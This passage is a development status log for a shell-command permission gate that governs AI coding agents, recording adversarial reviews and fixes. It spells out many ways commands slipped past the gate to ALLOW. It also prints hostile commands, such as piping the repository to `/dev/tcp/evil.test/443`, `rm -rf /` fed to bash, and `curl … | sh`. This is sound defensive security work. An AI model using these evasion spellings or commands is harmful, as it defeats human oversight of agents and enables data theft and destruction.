  so ordinary `echo $((i+1))` asked (only a substitution NESTED in the expression is a command); and
  `yarn|pnpm|bun|deno|npx|rake|sbt|bazel --version`, `pip list|show|freeze` and `python3 -m venv` had no matcher at
  all while `npm --version` was ALLOW. Ordinary development across seven ecosystems: 73 commands, 13 gated (18%),
  every one of them named with its reason in `EXPECTED_GATES`. Attack corpora unchanged at 200,334 commands /
  39 ALLOW. The frozen class list is `docs/architecture/phase-1-taxonomy.md`.
  **EXIT REVIEW 4 (2026-09-24), the first run under the third exit model — FAILED its own criterion, and that is
  the point.** Eight independent adversarial lenses, each reproducing every claim against the real evaluator through
  a shared probe; every non-proportionality claim then put to two independent skeptics instructed to REFUTE it.
  **59 of 60 refutation attempts failed** — the findings were real, and I reproduced each one cited below myself.
  **ZERO new architectural classes**: every confirmed finding is an instance of a class already frozen in
  `docs/architecture/phase-1-taxonomy.md` (segment structure, wrapper transparency, target classification,
  proportionality). The taxonomy held; the implementation did not.

  **Three of the severe findings were regressions introduced by commit c88902b, in this session.** The arithmetic
  branch was the worst defect of the whole phase: `$((cmd) )` and `$((cmd); true)` are COMMAND SUBSTITUTIONS in
  bash, zsh and dash — verified against real shells, they run the command — and reading every `$((` as arithmetic
  erased the command from the segment list entirely, so EVERY deny in the control plane was reachable at ALLOW,
  at any producer depth. A shell resolves the same ambiguity by requiring the span to close with `))`; the splitter
  now does too. Also mine: `( cd docs && ls )` asked because the cwd-restore marker was classified as a command,
  and a group's trailing redirection was orphaned into a headless segment.

  **Pre-existing floor crossings closed in the same pass.** A `#` comment was not recognised by the splitter, so an
  apostrophe in one — `echo hi  # isn't ready` — put the scanner into a phantom quoted state and swallowed every
  following line of a multi-line command. In `scriptSegments`, a `<<` ANYWHERE on a line opened a heredoc, so
  `cat <<< ready`, `grep -rn "<<<<<<< HEAD" .`, `echo "shift << Bits"` and `echo $((1<<BITS))` each made the whole
  REST of a script, hook or recipe invisible; an unterminated heredoc now reports opacity instead of a short list.
  A `case` branch kept its pattern glued to the command, a function definition kept its header glued to the body,
  `2>&1` and `>&2` were split on the `&` (and `>&FILE` lost its target), a backslash continuation inside a script
  body was cut in two, `exec -c -a NAME prog` hid the program behind the alias, `/bin/sh -c '…'` was read as a
  script path instead of an interpreter, a `-c` anywhere in `bash script.sh -c x` hijacked the interpreter,
  `trap 'CMD' EXIT` and `sh <<< 'CMD'` were unmodelled carriers, docker's global options displaced the subcommand
  so `docker --tls exec` reached ALLOW, docker's `image` management group was treated as a read verb so
  `docker --context production image rm|prune|load` reached ALLOW, and the engine's local test was a SUBSTRING
  match so `tcp://[fd00:acme:prod::1]:2375` was the local daemon.

  **Proportionality was the other half of the report, and it mattered more than usual**, because splitting script
  bodies correctly means every line of every script is now classified: `dirname`, `basename`, `mktemp`, `nproc`,
  `[`, `exit`, `sleep`, `seq`, `test`, `command -v NAME`, `popd >/dev/null`, `while … done < list.txt`, and every
  `VAR=$(cmd)` or `n=$((i+1))` binding asked. A name binding is now proven to execute nothing — except when the
  name IS execution, where a standalone `PATH=` or `LD_PRELOAD=` gets the same verdict as the same binding in
  front of a command, which it did not before.

  Measured before and after over a probe corpus: **18 verdicts moved, 4 stronger and 14 weaker, and every weaker
  one is provably closure-free shell structure** (`echo $((1+2))`, `( ls )`, `{ ls; }`, `build() { ls; }`,
  `while read … done < f`, `if [ -f x ]; then ls; fi`). Attack corpora unchanged at 200,334 commands / 39 ALLOW.
  What the review did NOT close is recorded in `docs/architecture/phase-1-residuals.md`; this line therefore stays
  IN PROGRESS, and Phase 1 is NOT closed.

  **A parallel-test failure was found while validating this pass, FIRST DIAGNOSED WRONGLY HERE, and then closed.**
  It was recorded as "several test processes materialising the same content-derived source identity at once". That
  is not the mechanism and it needs no concurrency: `selfIdentity()` caches the identity for the life of a process,
  the identity covers `docs/**` and `control-plane/**` — which this repository's own process edits every phase —
  and `initProject` wrote the PIN and then called an unguarded `materializeRuntime` that throws when the tree has
  moved. Every later `ego init` in that process left the project PINNED AND UNGOVERNED, which is the "8 of 19"
  suffix. Reproduced in a single process with one write. Closed with it: `materializeRuntime` now hashes the COPY
  rather than verifying the live tree and copying afterwards (which silently produced cache entries whose bytes
  hash to something other than their name, later reported as TAMPERED), losing a placement race is success rather
  than ENOTEMPTY, and `selfVersion()` is memoized instead of shelling out to git on each of its twelve call sites.
  Measured after the fix: the same deliberate provocation goes from 8 failures to 1, and the remaining one is a
  trust assertion reading an identity that genuinely moved. Full detail in docs/architecture/phase-1-residuals.md.
  **EXIT REVIEW 6 (2026-09-24) — FAILED, with ZERO new architectural classes.** Eight independent high-risk
  lenses against HEAD eab9a57, every claim reproduced through a shared probe and put to two skeptics instructed to
  refute it. The taxonomy held completely: no lens produced a shape of execution closure the eleven frozen classes
  cannot express, including the lens whose whole job was to try. What it did produce was a long list of
  unauthorized ALLOWs inside those classes, and the most valuable of them are the ones nobody had thought to spell:

  - **PS4 is an execution carrier.** bash RE-EXPANDS `PS4` before printing every traced command, so
    `PS4='$(git push origin main)' bash -x script` runs the push once per traced line — at ALLOW, because the
    normalizer strips a leading assignment and only re-surfaces names it recognises.
  - **An enumeration of program-valued git config keys is an allowlist, and everything off it reached ALLOW.**
    `diff.external`, `merge.<d>.driver`, `gpg.program`, `trailer.<t>.command`, `credential.helper`. The rule is now
    the SHAPE of the key — git's own convention is that a program-valued key ends in `command`, `driver`,
    `program`, `helper`, `textconv`, `clean`, `smudge`, `external` and their siblings.
  - **`post-index-change` fires on `git status`.** The verb-to-event table had no entry for the read commands that
    refresh the index, so a hook installed there was never resolved and `git status` stayed ALLOW.
  - **make's own shapes.** A conditional at column 0 inside a recipe ended the rule, dropping every guarded line;
    `.DEFAULT`, an old-style suffix rule and an ordinary target simply NAMED `.deploy` were all skipped as
    "special", so EGO proved absent a target make runs a recipe for.
  - **A client config directory selects the engine** (`docker --config DIR`, `podman --remote`), **a context
    CREATE writes the name-to-engine binding**, and **a URI query parameter overrides the URI host**
    (`postgres://localhost/app?host=prod-db`).
  - **Reading a production cluster's secrets is an act against it**, not a read the target model may wave through:
    `kubectl --context production get secrets -o yaml` was ALLOW under a capability named `k8s.local.apply`.
  - Also closed: `export FOO=bar BASH_ENV=…` (a governed binding is recognised wherever it sits on the line),
    `npm run X --userconfig=FILE`, `git stash --all` (which stashes the whole `.harness` tree), `git send-pack`
    and `git subtree push` as spellings of a push, and `less +'!CMD'` as an initial-command carrier.

  One of the review's own claims was REFUTED by the work: `mongosh --eval '<js>'` is not "a program EGO never
  read" — the code is inline and visible — and the rule written for it was reverted because it hid the target
  resolution and dropped a PRODUCTION mongo target from DENY to ASK. That is recorded because a review finding
  that turns out to be wrong is as much a result as one that turns out to be right.

  After the fixes there is no ALLOW left in the review's reproduction set: what remains is ASK, which is the
  designed gate. This line stays IN PROGRESS: the criterion is a FRESH review finding none, and the review that
  found these is not that review.

  **CLOSING EXIT REVIEW 6 (2026-09-24, commit d6375f8) — ten floor crossings, seven root causes, three more found
  by the corpus itself.** The remaining eight constats were all DENY-arriving-as-ASK, none an unauthorized ALLOW.
  They were fixed by CAUSE rather than by spelling, and the general statement in each case is the same shape:
  *a positive conclusion was drawn at the wrong position in the command.*

  - **An option's VALUE is not an operand.** The scan for `-c` stepped over `-o pipefail` and `-O extglob` as
    though they were the program, so `bash -o pipefail -c 'git push origin main'` lost its inline script.
  - **A `#` comment starts at a WORD boundary**, which an unquoted operator makes as surely as a space does:
    `echo hi;# it's fine` put the scanner into a phantom quoted state through the apostrophe.
  - **`source` and `.` RUN the file they are handed**, so `. <(echo CMD)` is the same execution edge as
    `bash <(echo CMD)`; the gate listed only the interpreters.
  - **`<&0` DUPLICATES the descriptor the pipe installed**; only a redirection from a FILE replaces it, and
    reading the duplication as a replacement killed the pipe edge in `echo 'rm -rf /' | bash <&0`.
  - **Target sensitivity belongs to the TOOL, not to the capability that won the first match.** `docker exec`
    is classified script-opaque — an interactive shell IS opaque — and that capability is not enrolled in the
    target model, so a shell on a production engine asked while `docker run` against the same engine was denied.
  - **A privilege wrapper's tail is a command**, and re-joining its tokens erased the quoting that says where a
    word ends: `sudo bash -c 'git push origin main'` became `bash -c git push origin main`, whose program is the
    single token `git`.
  - **`printf %b` numeric escapes are text.** `\xHH` and `\0NNN` are decoded and masked to a byte the way the
    shell masks them, so a literal asserted from an emitter is the text that will actually run.

  The generated cross-product then found three more while proving the fixes, which is what it is for:

  - the container engine was enrolled in the target RESOLVER but not in the target-ENVIRONMENT re-attachment, so
    an engine named by `DOCKER_HOST`/`DOCKER_CONTEXT` survived only while the assignment stayed leading;
  - the resolver read that re-attachment from `envInputs` only and never as a token — the "accepted but
    unconsumed" defect one layer down;
  - the normalizer stripped the environment prefix ONCE, *before* the shell keywords, so `if VAR=… cmd` kept its
    assignment at the head and matched no `^`-anchored matcher at all.

  Each of the ten is now a permanent corpus transform or class case, so every one is tested against every class
  and every class against every one. Two corpus transforms were themselves corrected rather than the kernel: a
  `nohup VAR=x cmd` composition is not a command any shell runs (the wrapper is handed `VAR=x` as its program),
  and `chmod\040777` is `\0407` — a BEL, not a space — because `\0ddd` takes up to three octal digits. Gating a
  command the shell would refuse to run is not a safety property.

  **Cold validation at d6375f8** (`~/.ego` removed first): typecheck PASSED, lint PASSED, **FIRST cold parallel
  run 234/234**, serial run 234/234, metamorphic/property suite 8/8, attack corpora 200,334 commands → 40 ALLOW
  (the identical known set: three `@HOME@` placeholders the fixtures never expand, and ordinary development
  commands the attack files carry as decoys), proportionality 7/44 (16%) and 13/73 (18%) — both unchanged.
  **EXIT REVIEW 7 (2026-09-24, HEAD 203ba67) — FAILED. 24 adversarial lenses, 730 agents, 45M subagent tokens.**
  `pass: false`. 157 findings survived three independent refuters each (one of which had to RE-RUN the command
  through the evaluator): **37 CRITICAL and 56 HIGH unauthorized ALLOW**, 17 lower-severity ALLOW, 8 floor
  crossings and 39 proportionality defects. **`newClasses: 0`** — the seventh consecutive review to produce no
  architectural class the frozen eleven cannot express.

  TWO THINGS ABOUT THAT NUMBER ARE RECORDED HONESTLY. First, 100 of the 730 agents FAILED on the account's weekly
  usage limit, all of them in the Classify phase, so `newClasses: 0` covers the findings whose classification
  completed and not the whole set; the class list was not fully re-tested by this review. Second, this review was
  three times the size of review 6 and its verifiers executed every claim, which is why it found what six earlier
  reviews did not. A bigger instrument is not a regression in the artifact; it is a measurement of how far the
  previous instruments reached.

  The CRITICAL and HIGH findings were closed by ROOT CAUSE, not by spelling. The ones that say something general:

  - **A STATE MARKER MUST BE UNFORGEABLE.** The analyzer injects markers into the segment stream and the control
    plane matches them with ordinary regexes. They were plain words, so a COMMAND could spell one:
    `define-function git; git push origin main` made the analyzer believe `git` was a locally defined function
    whose body it had already read, and the real push was classified read-only — ALLOW. The same forgery reached
    `psql`, `aws`, `terraform`, `vault` and `argocd`, i.e. through absolute core denies. Two locks now: every
    marker carries a NUL-delimited sentinel, and every byte entering the analyzer from outside has that sentinel
    mangled out.
  - **`$'…'` IS AN ANSI-C STRING, and a backslash escapes inside it.** Read as an ordinary single-quoted string,
    `echo $'\''` left the splitter believing it was inside a quote for the rest of the line; everything after it
    collapsed into one `echo`-headed segment, so every DENY spelled after it was ALLOW — the trust store,
    `curl … | sh`, a production database.
  - **THE COMMENT RULE HAD A SIBLING READER, AND THE FIX LANDED AT ONE OF THEM.** Exit review 6 widened the
    splitter's word boundary and left `stripComment` on the narrow whitespace test, so `echo a;#<<true` in a
    script or a hook opened a phantom heredoc that swallowed the next line. In `.git/hooks/pre-commit` that turns
    an ordinary `git commit` into a remote push. This is the meta-defect this repository has met before.
  - **`/dev/tcp/HOST/PORT` IS NOT A FILE.** bash intercepts the pathname in its own redirection code and calls
    connect(2), so `tar czf - . > /dev/tcp/evil.test/443` ships the whole repository — `.git` and `.env` included
    — with no network binary anywhere on the line, and the analyzer discarded the target as a device sink.
  - **A DEVICE IS A PROPERTY OF THE RESOLVED PATH.** `/dev/../Users/me/.zshrc` is a home file; a nine-character
    prefix had been turning an absolute deny into ALLOW for any path on the machine.
  - **A DESTINATION NAMED BY A FLAG IS A DESTINATION.** Every bundler's own output flag was unread, so
    `esbuild --outfile=.git/hooks/pre-commit` installed a hook, `--outfile=control-plane/permissions/matchers.md`
    rewrote the policy that decides every later verdict, and `vite --outDir .harness/runtime` wrote runtime state
    the kernel alone may write.
  - **GIT'S PATHSPEC NEEDS NO `--`.** `git checkout HEAD~1 control-plane/…` and `git checkout origin/evil
    .harness` were ALLOW while the identical act with two extra characters was an absolute deny.
  - **A GUARD THAT TESTS THE HEAD MUST RE-RUN AFTER THE HEAD CHANGES.** One wrapper hid the npx acquisition
    guard: `env npx --package=evil -c "tsc --version"` fetched and ran an arbitrary package while the kernel
    classified the decoy.
  - **A PRODUCER'S ARGUMENTS ARE PART OF ITS COMMAND.** npm appends what follows `--` to the script body, so
    `npm run build -- deploy` really runs `make build deploy`; only the manifest string was resolved.
  - **THE ENVIRONMENT IS FOUND WHERE THE COMMAND STARTS.** `export PGHOST=prod-db… && psql -c 'DROP TABLE users'`
    was ALLOW while the one-segment spelling was an absolute deny, because the target-selecting names were absent
    from the execution-environment vocabulary and the database resolver was the one resolver that did not read
    the environment at all.
  - **THE TARGET IS A PROPERTY OF THE TOOL,** in three more forms: a capability not enrolled cannot be
    re-targeted, an engine bound by `podman system connection` or `docker buildx create --driver remote` is an
    engine, and a signal's target is a VALUE rather than a suffix (`docker --context staging-run run` lost its
    own verb).

  **PROPORTIONALITY WAS A THIRD OF THE REVIEW, and is treated as the same seriousness.** `cp /tmp/foo.txt .` was
  an absolute core deny because the current directory contains `.harness`; `rm -rf node_modules` was refused
  outright because `node_modules/.bin` sits below it; `grep -rn 'NODE_OPTIONS=' .` — reading your own repository
  for the name of a variable — was refused because a binding is matched anywhere on the line. The statements:
  writing ONE named file into the repository root is not a write of its protected subtrees, a DELETE is not a
  write into (except of EGO's own governance tree, which stays denied), a search pattern is data, and a value
  that cannot name a program does not change what runs.

  **VALIDATION AT HEAD 7e08564, FROM A COLD STATE** (`~/.ego` removed first): typecheck PASSED, lint PASSED,
  FIRST cold parallel run 234/234, serial run 234/234, metamorphic/property suite 8/8, proportionality 13/73
  (18%, unchanged — the 13 are the accepted UNKNOWN_PRODUCER task runners). The in-repo cross-product now asserts
  **11,645** (class, spelling, transformation, producer) combinations, up from 4,395: 34 root semantic classes,
  121 canonical spellings, 87 transformations, 1,222 producer-carried variants and 98 ordinary commands.

  **THE 200,334-COMMAND ATTACK CORPORA COULD NOT BE RE-RUN AT THIS HEAD, and that is itself a finding.** Those
  files lived in a session temporary directory, which has since been cleaned; the harness and its inputs are
  gone. A validation gate that lives in `/tmp` is not a gate. The permanent replacement is the in-repo
  cross-product above, which is generated rather than accumulated and grows by one line per transformation.

  **EVERY FINDING OF EXIT REVIEW 7 IS NOW RESOLVED** (HEAD c1ba97d). The six floor crossings that outlived the
  first pass were closed by cause, and three of them were ONE cause: the resolver keeps tool heads in code and
  the control plane keeps head alternations in `matchers.md`, and the two lists drifted — `oc`, `mysqladmin` and
  the two-word `clickhouse client` were in the resolver and in neither matcher, so no capability matched, the
  re-targeting had nothing to act on, and the command fell through to `command.unknown`. That is fixed as a
  PROPERTY rather than as three lines — *every tool the target model knows reaches the target model* — and the
  property immediately found a seventh instance of itself, `nerdctl`. The other three: a SERVICE-SCOPED endpoint
  variable is evidence about THAT service (`AWS_ENDPOINT_URL_S3` says nothing about IAM, and the unscoped
  `AWS_ENDPOINT_URL` still covers everything, which is what LocalStack does); a GROUP writes the CONCATENATION of
  what its commands write, so the upstream of a pipe fed by one is the whole group; and the `flock` carrier had
  no matcher of its own.

  **Final cold validation at HEAD c1ba97d** (`~/.ego` removed first): typecheck PASSED, lint PASSED, FIRST cold
  parallel run 235/235, serial run 235/235, metamorphic/property suite 5/5 including the new tool-reachability
  property, proportionality 13/73 (18%, unchanged), release build reproduced. The in-repo cross-product asserts
  **12,887** combinations across **37** root semantic classes, 132 canonical spellings, 89 transformations, 1,333
  producer-carried variants and 98 ordinary commands.

  **A SECOND PASS THEN SWEPT ALL 157 FINDINGS, and found that the first pass had verified only the ones whose
  effect is on the COMMAND LINE.** Thirteen more — the ones whose effect lives in a workspace FILE — had never
  been reproduced at all. Every one reproduced, and every one is now closed: eight make shapes the parser could
  not see (`X != CMD` running while make parses; a rule line indented with SPACES, since only a TAB marks a
  recipe; `.PHONY-thing` matching `.PHONY` through a `\b`; a WILDCARD include; an included makefile the same
  makefile REMAKES, which makes what EGO read a pre-image; a target-specific rebind on a `::` rule; a PATH entry
  judged before `/usr/..` was resolved away; and an IMPLICIT `%.o: %.c` rule, now RESOLVED rather than reported
  blind), a whole producer (**a Dockerfile is a producer** — `docker build .` executes every `RUN` line as root
  with the whole context copied in), and git's content filters (a clean filter runs on `git status` and
  `git diff` too, and the test for an included config file is WHO PULLS IT IN rather than where it sits).

  The sweep of the remaining self-contained findings closed nine more, including two instances of a lesson this
  phase has now met four times: `join(' ')` used where `requote` was needed, because the quoting is what says
  where a word ends.

  **Three findings stay at ASK deliberately**, recorded with their reasons in `phase-1-residuals.md`: a password
  handed on a command line, `git revert`, and `rm -rf node_modules`. None is an unauthorized ALLOW; each is the
  designed human gate, and for `git revert` the stricter verdict was tried and was disproportionate.

  **Final cold validation at HEAD 2fcd3bc**: typecheck PASSED, lint PASSED, FIRST cold parallel run 235/235,
  serial run 235/235, proportionality 13/73 (18%, unchanged). The in-repo cross-product asserts **14,400**
  combinations across **41** root semantic classes, 146 canonical spellings, 89 transformations, 1,793
  producer-carried variants and 98 ordinary commands — more than three times the 4,395 it asserted when exit
  review 7 began.

  **PHASE 1 IS STILL NOT CLOSED.** Nothing from this review is open, but the exit criterion is a FRESH review
  finding none — and the review that found these is not that review. `INDEPENDENT-AGENT REVIEW` stays IN
  PROGRESS.
- INDEPENDENT-AGENT REVIEW: IN PROGRESS — rounds 1–15 plus challenges of the contract (22, 41, 37, 37, 24
  confirmed). **Resolution itself became the contract on 2026-09-22**, after challenge 5 showed that a producer's
  own parser gap was routed into the single state that fails open: "not parsed" and "not present" were the same
  observation. `resolution` is now a required 9-value outcome of which exactly two carry a positive claim, the
  execution closure covers make prerequisites/includes/-f/default goals/conditionals/.ONESHELL plus the ambient
  producers (git hooks, install lifecycle scripts), a write ledger makes a rewritten source STALE, and `cwdVerified`
  is earned rather than defaulted. Pinned by `packages/kernel/test/resolution.test.ts`. Challenge 6 then ran against
  that architecture and returned **32 confirmed findings and 11 claimed new architectural classes**. Reproduced and
  closed in session: the git ambient closure guessed `.git/hooks` instead of asking git (husky's `core.hooksPath`
  and linked worktrees made a hostile hook invisible while it fired); `.RECIPEPREFIX` made a whole recipe invisible;
  GNU make's candidate order was inverted, and fixing it exposed that `realpathSync` preserves the requested
  spelling on a case-insensitive filesystem, which had unhooked the freshness ledger; four real `npm install`
  aliases skipped the ambient closure and `--no-scripts` was accepted although npm ignores it; and a
  PROPORTIONALITY regression of ours — one pattern rule made every unrelated target ASK. The remaining findings are
  reported to the product owner as architectural classes, not patched. The eight classes were then unified into a
  first-class **verified execution environment** (typed dispatch, multi-dimensional context, configuration closure,
  binding resolution, scoped opacity, transitive freshness, self-modifying producers, ambient events by semantic
  event), pinned by `packages/kernel/test/environment.test.ts`. Challenge 7 ran against THAT and returned **29
  confirmed findings and 4 claimed new architectural classes**. Reproduced and closed in session: a bare `-n`
  discarded the ENTIRE ambient hook closure for every git verb (suppression is now per EVENT), and three of the six
  declared environment dimensions were initialised, threaded and never read — the same "accepted but unconsumed"
  defect this phase removed from doctor, committed in the artifact whose purpose is honesty. The four new classes
  are reported to the product owner, not patched. Those four were then unified into COMPLETE PROVENANCE — process
  inputs, dispatch ownership, trust delegation, tree state — with an authored bounded-command vocabulary
  (`control-plane/workspace/bounded-commands.md`) replacing the silence of a producer lookup, pinned by
  `packages/kernel/test/provenance.test.ts`. Challenge 8 ran against THAT and returned **27 confirmed findings and
  4 new architectural classes**: positional incompleteness of an execution-input dimension (`env VAR=x cmd`),
  positive-by-default closure (`ABSENT_VERIFIED` as the fallback for an unclassified head), producer subject
  identity (the git closure resolved against the workspace root rather than the repository the command targets),
  and non-canonical command identity (`npx` read by the matchers but not by the dispatch). All four instances were
  reproduced in session with real ground truth and closed, together with the instance findings. The trend across
  four rounds of this architecture — 12, 11, 4, 4 claimed new classes — was falling but had not reached zero.
  **Challenge 9 (the decision round, 2026-09-23) is the first to find ZERO new architectural classes.** All 36 of
  its findings were instances of classes already named, and 25 were real MUST_FIX or misclassification — chiefly
  the container runtime never enrolled in the Q98 target model (`docker --context production stack deploy` was
  ALLOW while `kubectl --context production apply` was DENY on the identical signal), the unbounded
  program-operand rule not extended to the compiler heads added in the same pass, three spellings of the
  configuration-closure gap, `.mcp.json` and `node_modules/.bin` not protected, shell reads answering differently
  from the Read tool, and an administrability escape hatch the residuals document promised before it existed. All
  25 are closed and pinned. Every remaining finding is classified in `docs/architecture/phase-1-residuals.md` as
  MUST_FIX, ACCEPTED_PRODUCT_BEHAVIOR, UNKNOWN_PRODUCER/FAIL-SAFE or CONTAINMENT_DEPENDENCY, and only a MUST_FIX
  counts as an unresolved defect. The ARCHITECTURE has converged; the INSTANCES had not. This line is therefore
  **NOT PASSED**: a round that finds 25 unauthorized ALLOWs is not a round that found none, and closing them
  afterwards does not turn it into one. The criterion needs a round that finds none.
  **Challenge 10 (the Phase-1 exit review, 2026-09-23) again found ZERO new architectural classes** — 28 confirmed
  findings, all instances. The load-bearing one: a search tool's `pattern` operand reached the credential store at
  ALLOW while its `path` operand was DENY, because the guard concatenated `base + '/' + pattern` and tested the raw
  string, so an absolute, `../` or `~/` pattern could never match. Also closed: the container engine selected by
  `DOCKER_CONTEXT`, glued program operands (`gcc -B/tmp/evil`), `git clone --config core.sshCommand=`, target-specific
  and `override` makefile rebinds, plugin declarations in INI/TOML and in the config files those tools really read,
  unenumerable writes (archive extraction, recursive copy) missing from the ledger, EGO_HOME protected only under
  `trust/`, and a `node_modules/.bin` symlink whose TARGET was writable. Two were MY OWN regressions breaking
  ordinary work — `docker run … sh -c "…"` denied as a remote engine and `git blame -C file` downgraded — both from
  reading an option outside the position it occupies. Two documented promises the code never kept were corrected.
  All fixed and pinned; the exit rule requires a further fresh round.
  **Challenge 11 (the second exit review, 2026-09-24) again found ZERO new architectural classes** — 29 confirmed,
  all instances. The load-bearing one was structural: matchers are first-match-wins, and the `--output|-o`
  write-destination matcher was authored above the `--template` hook-install deny, so `git clone --template=evil
  -o up URL` turned a DENY into an ALLOW while real git executed the planted hook. Rather than reorder the table,
  a matcher whose capability describes only a write DESTINATION is now declared `additive`: it contributes its hit
  and can never win the segment's semantic class. Also closed: `make` proving absence for one goal over another's
  unresolved closure, `make -f -` and `-E`, `hash -p`/`enable -f` declared bounded, `npm init <initializer>`, a
  global option whose value was read as the subcommand, `--builder`, `init.templateDir`, mysql's `-e` escape, a
  root-anchored or `..`-carrying glob pattern, a git `include.path` filter, and a positional db script file. Four
  more were MY OWN proportionality regressions: `SHELL := /bin/bash`, `g++`, `nodeLinker` and an over-applied
  config-program scope.

  **THE TREND, stated because it is decision-relevant.** Three consecutive rounds — 9, 10, 11 — found **zero new
  architectural classes** and **25, 28 and 29 instances**. The architecture has converged; instance discovery has
  not, and nothing in the data suggests it will reach zero: an adversarial fleet of this size finds a comparable
  number of new surfaces every time. An exit criterion expressed in INSTANCES may therefore never be met, while
  one expressed in CLASSES has been met three times running. That is a product decision, recorded here rather than
  taken.
  **Challenge 12 (the third exit review, 2026-09-24): 26 confirmed, ZERO new architectural classes** — the two
  entries the fleet labelled "new" were documentation defects, not execution-closure shapes. Its headline finding
  is the most serious any round has produced: `splitShellSegments` guarded the command-substitution extractor with
  `!inSingle && !inDouble`, the same condition as the operator branches. That is right for operators and wrong for
  substitution, which only SINGLE quotes suppress — so `echo "$(git push origin main)"` was ALLOW and the push
  ran, verified against a real shell. An entire execution channel, through which every DENY in the control plane
  was reachable in one Bash call. Also closed: `npx --package` acquiring a package behind a decoy command,
  `kubectl config use-context production`, a `kubectl exec -- CMD` body never analysed, `exec -a NAME prog`,
  `helm --post-renderer`, `GOFLAGS=-toolexec`, `diff.external`, `env -C`, and case-insensitive `npm_config_*`. Two
  more proportionality regressions of mine: `docker --context default` — the local daemon's own name — denied, and
  a documentation sentence listing `npm test` among the commands that stay ALLOW.

  **FOUR rounds now: 0, 0, 0, 0 new architectural classes; 25, 28, 29, 26 instances.** The instance count is flat.
  The architecture has been stable for four consecutive adversarial passes of this size, and instance discovery
  shows no sign of terminating. Challenge 5, run against the by-construction architecture on 2026-09-22, returned 24 confirmed findings
  and claimed 12 new architectural classes. One was reproduced in session and closed the same day (KNOWN HEAD +
  UNEXAMINED REMAINDER — a `cd`/`pushd` head exited the per-segment loop, so a redirection on that segment reached
  ALLOW past two absolute core denies). One claimed HIGH was REFUTED in session: `&&` and shell functions inside a
  script body are analysed, contrary to the report. The remainder — chiefly the make producer routing its own parser
  gaps into `unresolved: 'missing'`, the one state that preserves a declared ALLOW — are NOT fixed and are reported
  to the product owner as architectural decisions, not as defects to patch. This line stays IN PROGRESS. **Security was made true by construction on 2026-09-22**, after those challenges kept finding the same
  meta-defect in the repairs rather than in the rules: a fix landed at the place under inspection and missed its
  siblings (the opacity filter covered 1 producer of 4; the canonical pipeline was true for 3 of 4). The producer
  contract is now carried by the type — `resolveScriptCommand` has no field a verdict could travel in — and
  `analyzeSegments` is the single pipeline every body reaches at every depth. Pinned by
  `packages/kernel/test/producer-contract.test.ts`. **The exit criterion changed on 2026-09-22.** The old
  criterion ("one complete round ends with zero confirmed HIGH or MEDIUM") was a test of whether hardening the command
  classifier could converge. It was measured with an identical 14-cluster instrument across three rounds: 61, 76, 67.
  Between rounds 14 and 15 all 76 findings were fixed and pinned; an identical pass then found 67 more, many of them
  neighbouring spellings of those fixes. Exhaustive shell-syntax enumeration is therefore not a credible security
  boundary, and the product owner replaced the criterion with the layered, evidence-based contract recorded in
  `docs/architecture/security-model.md` and in issue #1. This line still becomes PASSED only when an independent
  review challenges THAT contract and leaves no HIGH or MEDIUM finding against it; it is never set from an in-session
  review. Rounds 1–13 detail follows. (round 7 partial, re-covered by complete rounds 8–13); every
  confirmed HIGH/MEDIUM fixed and pinned. This line becomes PASSED only when a COMPLETE round ends with no confirmed
  HIGH or MEDIUM finding; round 13 surfaced **61** (76 claimed, 15 refuted), so a further round is required. The count
  had been trending down (19, 16, 6, 10, 13, 9, 5) but round 13 widened the fleet from 5 dimension skeptics to 14
  adversarial clusters with shared reproduction probes, and the new clusters found surfaces earlier rounds never
  reached — chiefly an unbounded `console.log(…)`/`print(…)` carve-out in `command.read-only` that granted silent
  arbitrary execution, and a `git commit -a` pre-commit scan that read the stale real index and scanned zero files.
  A falling count across rounds measures the questions asked, not the residual risk. This line becomes PASSED only
  when a round ends with no confirmed HIGH or MEDIUM finding, and FAILED otherwise; it is never set from an
  in-session review.
- CONFORMANCE: NOT RUN — the host conformance suite (real Claude Code and Codex CLI hook semantics, permission
  modes, managed tier, prompt-hook caller marker) is a phase 6 deliverable; `claude-code` capabilities marked
  SUPPORTED in the host matrix rest on the pre-build verification recorded in the baseline (section C), `codex-cli`
  capabilities are UNVERIFIED and the Codex dialect fails closed on everything but ALLOW.
